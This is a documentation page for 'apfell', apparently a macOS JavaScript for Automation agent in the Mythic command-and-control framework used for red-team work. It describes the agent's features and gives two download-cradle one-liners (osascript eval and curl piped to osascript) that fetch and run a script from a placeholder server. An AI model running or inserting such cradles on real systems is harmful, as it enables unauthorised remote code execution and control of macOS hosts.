+++
title = "apfell"
chapter = false
weight = 5
+++

![logo](/agents/apfell/apfell.svg?width=200px)
## Summary

Apfell is a JavaScript for Automation (JXA) agent for macOS. 

### Highlighted Agent Features
- Similar to a PowerShell script, JXA execution goes through either a trusted, Apple signed binary (`osascript`) or through any program that imports `OSAKit`. Because JXA is an interpreted language (rather than a compiled one), it requires certain permissions (like JIT exceptions) when dealing with Apple's Notarization.
- JXA has access to almost all ObjectiveC APIs through the ObjC bridge. If at all possible, `apfell` uses API calls instead of command-line execution.
- There are multiple download cradle options:
```Bash
1. osascript -l JavaScript -e "eval(ObjC.unwrap( $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://serverIPhere/filename')), $.NSUTF8StringEncoding)));"
2. curl http://serverIPHere/filename | osascript -l JavaScript &
```
- The agent uses Objective C API calls to do a full encrypted key exchange with the Mythic server with a combination of AES256 and RSA.


### Important Notes
The entire agent is single threaded due to an ObjectiveC / JXA bridge limitation that I have been unable to figure out. Be careful to not issue shell commands that require user input because you will lose your agent.

The agent cannot connect to self-signed certificates due to a limitation in overriding the NSURL connection settings for cert validation within JXA. 

## Authors
@its_a_feature_


### Special Thanks to These Contributors
- @xorrior
